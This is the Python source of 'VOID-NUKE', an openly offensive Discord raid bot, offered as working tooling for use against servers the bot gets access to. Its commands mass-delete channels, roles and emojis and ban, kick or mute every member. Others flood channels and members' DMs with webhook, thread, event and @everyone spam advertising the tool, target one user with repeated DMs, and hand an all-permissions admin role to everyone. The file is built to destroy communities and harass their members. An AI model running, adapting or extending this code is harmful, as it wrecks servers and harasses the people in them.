"""
VOID-NUKE WEB - Optimized Bot Core
Optimized for Render Free Tier: 512MB RAM, 0.1 CPU
- Low concurrency (Semaphore 3)
- No message cache
- Minimal intents
- GC friendly
- Thread-safe log buffer
"""
import asyncio
import random
import gc
import time
import json
from datetime import datetime, timezone, timedelta
from collections import deque
import discord
from discord.ext import commands
import aiohttp

# --- Config (same as original) ---
TELEGRAM_TAG = "t.me/v0idtool"
DISCORD_TAG = "discord.gg/voidv2"
GITHUB_URL = "https://github.com/v0id4real/Void-Nuke"
PUB = f"||@everyone|| **# RAID BY VOID-NUKE** : {TELEGRAM_TAG} · {DISCORD_TAG} <{GITHUB_URL}>"
PUB_SHORT = f"{TELEGRAM_TAG} · {DISCORD_TAG} | github.com/v0id4real"
RAID_NAME = "raid-by-void"

# Optimization: limit concurrency to protect 0.1 CPU
MAX_CONCURRENT = 3  # down from uncapped gather
SEM = asyncio.Semaphore(MAX_CONCURRENT)

class LogBuffer:
    def __init__(self, maxlen=500):
        self.logs = deque(maxlen=maxlen)
        self.lock = asyncio.Lock() if False else None  # we use thread lock externally
    
    def add(self, level, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        entry = {"ts": ts, "level": level, "msg": msg, "full": f"[{ts}] [{level}] {msg}"}
        self.logs.append(entry)
        print(f"[{ts}] [{level}] {msg}", flush=True)
        return entry

    def get_all(self):
        return list(self.logs)
    
    def clear(self):
        self.logs.clear()

log_buffer = LogBuffer()

def log_ok(msg): return log_buffer.add("OK", msg)
def log_err(msg): return log_buffer.add("ERR", msg)
def log_warn(msg): return log_buffer.add("WARN", msg)
def log_info(msg): return log_buffer.add("INFO", msg)

class BotManager:
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.bot = None
            cls._instance.bot_thread = None
            cls._instance.loop = None
            cls._instance.guild_id = None
            cls._instance.connected = False
            cls._instance.guild_info = {}
            cls._instance._running_tasks = set()
        return cls._instance

    def get_guild(self):
        if not self.bot or not self.guild_id:
            return None
        try:
            return self.bot.get_guild(int(self.guild_id))
        except:
            return None

    async def _limited_gather(self, coros, return_exceptions=True):
        """Gather with semaphore to limit CPU/RAM"""
        async def _wrap(coro):
            async with SEM:
                try:
                    return await coro
                except Exception as e:
                    if return_exceptions:
                        return e
                    raise
                finally:
                    await asyncio.sleep(0.25)  # rate-limit friendly, saves CPU
        
        # Process in chunks to avoid memory spike
        results = []
        chunk_size = 10
        for i in range(0, len(coros), chunk_size):
            chunk = coros[i:i+chunk_size]
            res = await asyncio.gather(*[_wrap(c) for c in chunk], return_exceptions=return_exceptions)
            results.extend(res)
            gc.collect()
            await asyncio.sleep(0.3)
        return results

    # --- COMMAND IMPLEMENTATIONS (optimized) ---
    
    async def cmd_nuke(self, params):
        g = self.get_guild()
        if not g: return log_err("Guild not found")
        log_warn(f"NUKE {g.name} | {len(g.channels)}ch {len(g.roles)} roles")
        
        # Delete channels & roles
        await self._limited_gather([c.delete() for c in list(g.channels)])
        await self._limited_gather([r.delete() for r in list(g.roles) if not r.is_default()])
        
        # Create 50 channels & roles (reduced to 30 for free tier to save RAM)
        num = min(int(params.get("num_channels", 30)), 50)
        created = await self._limited_gather([g.create_text_channel(RAID_NAME) for _ in range(num)])
        text_chans = [c for c in created if isinstance(c, discord.TextChannel)]
        log_ok(f"{len(text_chans)} channels created")
        
        async def make_role():
            async with SEM:
                try:
                    col = discord.Colour.from_rgb(random.randint(180,255), 0, 0)
                    await g.create_role(name="VOID-NUKE", colour=col)
                    return True
                except: return False
        
        roles = await self._limited_gather([make_role() for _ in range(num)])
        log_ok(f"{roles.count(True)} roles created")
        
        # Webhook spam 3 messages per channel (lighter)
        async def raid_chan(chan):
            async with SEM:
                try:
                    wh = await chan.create_webhook(name="VOID-NUKE")
                    for _ in range(3):
                        await wh.send(content=PUB, username="VOID-NUKE")
                    await wh.delete()
                    log_ok(f"spammed #{chan.name}")
                except Exception as e:
                    log_err(str(e)[:100])
        
        await self._limited_gather([raid_chan(c) for c in text_chans])
        log_ok("NUKE COMPLETE")
        gc.collect()

    async def cmd_auto_raid(self, params):
        g = self.get_guild()
        if not g: return
        log_warn(f"AUTO RAID {g.name}")
        await self._limited_gather([c.delete() for c in list(g.channels)])
        chans = await self._limited_gather([g.create_text_channel(RAID_NAME) for _ in range(20)])
        chans = [c for c in chans if isinstance(c, discord.TextChannel)]
        async def mk_role():
            async with SEM:
                try:
                    await g.create_role(name="VOID-NUKE", colour=discord.Colour.random())
                    return True
                except: return False
        await self._limited_gather([mk_role() for _ in range(20)])
        async def spam(c):
            async with SEM:
                try:
                    for _ in range(int(params.get("num_msg", 3))):
                        await c.send(PUB)
                except: pass
        await self._limited_gather([spam(c) for c in chans])
        log_ok("AUTO RAID DONE")

    async def cmd_delete_channels(self, params):
        g = self.get_guild()
        if not g: return
        r = await self._limited_gather([c.delete() for c in list(g.channels)])
        log_ok(f"Deleted {sum(1 for x in r if not isinstance(x, Exception))} channels")

    async def cmd_delete_emojis(self, params):
        g = self.get_guild()
        if not g: return
        if not g.emojis: return log_info("No emojis")
        await self._limited_gather([e.delete() for e in list(g.emojis)])
        log_ok("Emojis deleted")

    async def cmd_delete_stickers(self, params):
        g = self.get_guild()
        if not g: return
        if not g.stickers: return log_info("No stickers")
        await self._limited_gather([s.delete() for s in list(g.stickers)])
        log_ok("Stickers deleted")

    async def cmd_create_channels(self, params):
        g = self.get_guild()
        if not g: return
        num = min(int(params.get("quantity", 5)), 50)
        typ = params.get("type", "text")
        name = params.get("name", RAID_NAME)
        coros = []
        for _ in range(num):
            if typ == "voice":
                coros.append(g.create_voice_channel(name))
            else:
                coros.append(g.create_text_channel(name))
        r = await self._limited_gather(coros)
        log_ok(f"Created {sum(1 for x in r if not isinstance(x, Exception))}/{num} channels")

    async def cmd_create_roles(self, params):
        g = self.get_guild()
        if not g: return
        num = min(int(params.get("quantity", 5)), 50)
        name = params.get("name", "VOID-NUKE")
        async def cr():
            async with SEM:
                try:
                    await g.create_role(name=name, colour=discord.Colour.random())
                    return True
                except: return False
        r = await self._limited_gather([cr() for _ in range(num)])
        log_ok(f"Created {r.count(True)} roles")

    async def cmd_create_cats(self, params):
        g = self.get_guild()
        if not g: return
        num = min(int(params.get("quantity", 3)), 20)
        name = params.get("name", "VOID-NUKE")
        async def cc(i):
            async with SEM:
                try:
                    await g.create_category(f"{name} {i+1}")
                    return True
                except: return False
        r = await self._limited_gather([cc(i) for i in range(num)])
        log_ok(f"Created {r.count(True)} categories")

    async def cmd_rename_channels(self, params):
        g = self.get_guild()
        if not g: return
        name = params.get("name", RAID_NAME)
        async def rn(i, ch):
            async with SEM:
                try:
                    await ch.edit(name=f"{name}-{i+1}")
                    return True
                except: return False
        chans = [c for c in g.channels if isinstance(c, (discord.TextChannel, discord.VoiceChannel))]
        r = await self._limited_gather([rn(i,c) for i,c in enumerate(chans)])
        log_ok(f"Renamed {r.count(True)} channels")

    async def cmd_rename_roles(self, params):
        g = self.get_guild()
        if not g: return
        name = params.get("name", "VOID-NUKE")
        roles = [r for r in g.roles if not r.is_default()]
        async def rr(i, role):
            async with SEM:
                try:
                    await role.edit(name=f"{name}-{i+1}")
                    return True
                except: return False
        r = await self._limited_gather([rr(i, role) for i, role in enumerate(roles)])
        log_ok(f"Renamed {r.count(True)} roles")

    async def cmd_edit_server(self, params):
        g = self.get_guild()
        if not g: return
        try:
            await g.edit(name=params.get("name", "RAIDED BY VOID-NUKE"))
            log_ok("Server name changed")
        except Exception as e:
            log_err(str(e)[:100])

    async def cmd_rename_members(self, params):
        g = self.get_guild()
        if not g: return
        nick = params.get("name", "VOID")[:32]
        async def rn(m):
            async with SEM:
                if m.bot: return False
                try:
                    await m.edit(nick=nick)
                    return True
                except: return False
        r = await self._limited_gather([rn(m) for m in g.members])
        log_ok(f"Renamed {r.count(True)} members")

    async def cmd_ban_all(self, params):
        g = self.get_guild()
        if not g: return
        bot_id = self.bot.user.id if self.bot else 0
        async def ban(m):
            async with SEM:
                if m.id == bot_id or m.bot: return False
                try:
                    await m.ban(reason=PUB_SHORT)
                    log_ok(f"Banned {m.name}")
                    return True
                except: return False
        r = await self._limited_gather([ban(m) for m in g.members])
        log_ok(f"Banned {r.count(True)}")

    async def cmd_kick_all(self, params):
        g = self.get_guild()
        if not g: return
        bot_id = self.bot.user.id if self.bot else 0
        async def kick(m):
            async with SEM:
                if m.id == bot_id or m.bot: return False
                try:
                    await m.kick(reason=PUB_SHORT)
                    return True
                except: return False
        r = await self._limited_gather([kick(m) for m in g.members])
        log_ok(f"Kicked {r.count(True)}")

    async def cmd_mute_all(self, params):
        g = self.get_guild()
        if not g: return
        mins = int(params.get("minutes", 60))
        until = datetime.now(timezone.utc) + timedelta(minutes=mins)
        async def mute(m):
            async with SEM:
                if m.bot: return False
                try:
                    await m.timeout(until)
                    return True
                except: return False
        r = await self._limited_gather([mute(m) for m in g.members])
        log_ok(f"Muted {r.count(True)}")

    async def cmd_unban_all(self, params):
        g = self.get_guild()
        if not g: return
        bans = [b async for b in g.bans()]
        async def ub(b):
            async with SEM:
                try:
                    await g.unban(b.user)
                    return True
                except: return False
        r = await self._limited_gather([ub(b) for b in bans])
        log_ok(f"Unbanned {r.count(True)}")

    async def cmd_strip_roles(self, params):
        g = self.get_guild()
        if not g: return
        async def sr(m):
            async with SEM:
                if m.bot: return False
                roles = [r for r in m.roles if not r.is_default()]
                if not roles: return False
                try:
                    await m.remove_roles(*roles)
                    return True
                except: return False
        r = await self._limited_gather([sr(m) for m in g.members])
        log_ok(f"Stripped {r.count(True)} members")

    async def cmd_spam(self, params):
        g = self.get_guild()
        if not g: return
        count = min(int(params.get("count", 3)), 10)
        content = params.get("content", PUB)
        text_chans = [c for c in g.channels if isinstance(c, discord.TextChannel)]
        async def sp(c):
            async with SEM:
                try:
                    for _ in range(count):
                        await c.send(content)
                    log_ok(f"Spammed #{c.name}")
                    return True
                except: return False
        await self._limited_gather([sp(c) for c in text_chans])

    async def cmd_webhook_spam(self, params):
        g = self.get_guild()
        if not g: return
        count = min(int(params.get("count", 2)), 5)
        content = params.get("content", PUB)
        async def ws(c):
            async with SEM:
                try:
                    wh = await c.create_webhook(name="VOID-NUKE")
                    for _ in range(count):
                        await wh.send(content=content, username="VOID-NUKE")
                    await wh.delete()
                    return True
                except: return False
        text_chans = [c for c in g.channels if isinstance(c, discord.TextChannel)]
        await self._limited_gather([ws(c) for c in text_chans])
        log_ok("Webhook spam done")

    async def cmd_dm_all(self, params):
        g = self.get_guild()
        if not g: return
        content = params.get("content", PUB)
        async def dm(m):
            async with SEM:
                if m.bot: return False
                try:
                    await m.send(content)
                    return True
                except: return False
        r = await self._limited_gather([dm(m) for m in g.members])
        log_ok(f"DM'd {r.count(True)} members")

    async def cmd_dm_spam_user(self, params):
        g = self.get_guild()
        if not g: return
        try:
            uid = int(params.get("user_id"))
            count = min(int(params.get("count", 5)), 20)
            content = params.get("content", PUB)
            target = await g.fetch_member(uid)
            try:
                target = target
            except:
                target = await self.bot.fetch_user(uid)
            for i in range(count):
                async with SEM:
                    try:
                        await target.send(content)
                        log_ok(f"[{i+1}/{count}] DM to {target.name}")
                        await asyncio.sleep(0.8)
                    except Exception as e:
                        log_err(str(e)[:100])
                        break
        except Exception as e:
            log_err(f"DM spam failed: {e}")

    async def cmd_server_info(self, params):
        g = self.get_guild()
        if not g: return
        info = {
            "name": g.name,
            "id": str(g.id),
            "members": g.member_count,
            "channels": len(g.channels),
            "roles": len(g.roles),
            "emojis": len(g.emojis),
            "boosts": g.premium_subscription_count,
        }
        log_info(json.dumps(info))
        return info

    async def cmd_lockdown(self, params):
        g = self.get_guild()
        if not g: return
        async def lock(ch):
            async with SEM:
                try:
                    await ch.set_permissions(g.default_role, send_messages=False)
                    return True
                except: return False
        tcs = [c for c in g.channels if isinstance(c, discord.TextChannel)]
        await self._limited_gather([lock(c) for c in tcs])
        log_ok("Lockdown done")

    async def cmd_mass_move(self, params):
        g = self.get_guild()
        if not g: return
        vcs = [c for c in g.channels if isinstance(c, discord.VoiceChannel)]
        if not vcs or not params.get("target_id"):
            return log_err("No VC target")
        try:
            target = g.get_channel(int(params.get("target_id")))
            if not target: return log_err("Target VC not found")
            async def mv(m):
                async with SEM:
                    if m.voice and m.voice.channel:
                        try:
                            await m.move_to(target)
                            return True
                        except: return False
                    return False
            r = await self._limited_gather([mv(m) for m in g.members])
            log_ok(f"Moved {r.count(True)} members")
        except Exception as e:
            log_err(str(e))

    async def cmd_deafen_all(self, params):
        g = self.get_guild()
        if not g: return
        async def df(m):
            async with SEM:
                if m.voice and m.voice.channel:
                    try:
                        await m.edit(deafen=True)
                        return True
                    except: return False
                return False
        r = await self._limited_gather([df(m) for m in g.members])
        log_ok(f"Deafened {r.count(True)}")

    async def cmd_disconnect_all(self, params):
        g = self.get_guild()
        if not g: return
        async def dc(m):
            async with SEM:
                if m.voice and m.voice.channel:
                    try:
                        await m.move_to(None)
                        return True
                    except: return False
                return False
        r = await self._limited_gather([dc(m) for m in g.members])
        log_ok(f"Disconnected {r.count(True)}")

    async def cmd_thread_spam(self, params):
        g = self.get_guild()
        if not g: return
        count = min(int(params.get("count", 2)), 5)
        name = params.get("name", "VOID-NUKE")
        tcs = [c for c in g.channels if isinstance(c, discord.TextChannel)]
        async def ts(ch):
            async with SEM:
                try:
                    for i in range(count):
                        m = await ch.send(PUB)
                        await m.create_thread(name=f"{name} {i+1}")
                    return True
                except: return False
        await self._limited_gather([ts(c) for c in tcs])
        log_ok("Thread spam done")

    async def cmd_invite_spam(self, params):
        g = self.get_guild()
        if not g: return
        count = min(int(params.get("count", 3)), 10)
        tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
        if not tc: return log_err("No text channels")
        for _ in range(count):
            async with SEM:
                try:
                    inv = await random.choice(tc).create_invite(max_age=60, max_uses=1, unique=True)
                    log_ok(inv.url)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    log_err(str(e)[:80])

    async def cmd_get_admin(self, params):
        g = self.get_guild()
        if not g: return
        try:
            role = await g.create_role(name="VOID-NUKE ADMIN", permissions=discord.Permissions.all(), colour=discord.Colour.red())
            target_id = params.get("user_id")
            if not target_id:
                async def give(m):
                    async with SEM:
                        if not m.bot:
                            try:
                                await m.add_roles(role)
                                return True
                            except: return False
                        return False
                r = await self._limited_gather([give(m) for m in g.members])
                log_ok(f"Gave admin to {r.count(True)}")
            else:
                try:
                    m = await g.fetch_member(int(target_id))
                    await m.add_roles(role)
                    log_ok(f"Gave admin to {m.name}")
                except Exception as e:
                    log_err(str(e))
        except Exception as e:
            log_err(f"Admin fail: {e}")

    # Additional spam types (light versions)
    async def cmd_spoiler_spam(self, params):
        g = self.get_guild()
        if not g: return
        count = min(int(params.get("count", 2)), 5)
        content = params.get("content", PUB_SHORT)
        wrapped = f"||{content}||\n{PUB}"
        tcs = [c for c in g.channels if isinstance(c, discord.TextChannel)]
        async def sp(c):
            async with SEM:
                try:
                    for _ in range(count):
                        await c.send(wrapped)
                    return True
                except: return False
        await self._limited_gather([sp(c) for c in tcs])

    async def cmd_event_spam(self, params):
        g = self.get_guild()
        if not g: return
        count = min(int(params.get("count", 3)), 10)
        name = params.get("name", "VOID-NUKE")
        for i in range(count):
            async with SEM:
                try:
                    start = datetime.now(timezone.utc) + timedelta(hours=1, minutes=i)
                    end = start + timedelta(hours=2)
                    await g.create_scheduled_event(
                        name=f"{name} #{i+1}",
                        description=PUB_SHORT,
                        start_time=start,
                        end_time=end,
                        entity_type=discord.EntityType.external,
                        location=PUB_SHORT,
                        privacy_level=discord.PrivacyLevel.guild_only
                    )
                    log_ok(f"Event {i+1} created")
                except Exception as e:
                    log_err(str(e)[:100])
                await asyncio.sleep(0.5)

    async def cmd_clone_server(self, params):
        g = self.get_guild()
        if not g: return
        data = {
            "name": g.name,
            "channels": [{"name": c.name, "type": str(c.type)} for c in g.channels],
            "roles": len(g.roles),
        }
        log_ok(f"Cloned: {json.dumps(data)[:200]}")
        return data

    ACTIONS = {
        "nuke": cmd_nuke,
        "auto_raid": cmd_auto_raid,
        "ban_all": cmd_ban_all,
        "kick_all": cmd_kick_all,
        "mute_all": cmd_mute_all,
        "unban_all": cmd_unban_all,
        "del_channels": cmd_delete_channels,
        "del_emojis": cmd_delete_emojis,
        "del_stickers": cmd_delete_stickers,
        "create_channels": cmd_create_channels,
        "create_roles": cmd_create_roles,
        "create_cats": cmd_create_cats,
        "rename_channels": cmd_rename_channels,
        "rename_roles": cmd_rename_roles,
        "edit_server": cmd_edit_server,
        "rename_members": cmd_rename_members,
        "strip_roles": cmd_strip_roles,
        "spam": cmd_spam,
        "webhook_spam": cmd_webhook_spam,
        "dm_all": cmd_dm_all,
        "dm_spam_user": cmd_dm_spam_user,
        "server_info": cmd_server_info,
        "lockdown": cmd_lockdown,
        "mass_move": cmd_mass_move,
        "deafen_all": cmd_deafen_all,
        "disconnect_all": cmd_disconnect_all,
        "thread_spam": cmd_thread_spam,
        "invite_spam": cmd_invite_spam,
        "get_admin": cmd_get_admin,
        "spoiler_spam": cmd_spoiler_spam,
        "event_spam": cmd_event_spam,
        "clone_server": cmd_clone_server,
    }

manager = BotManager()
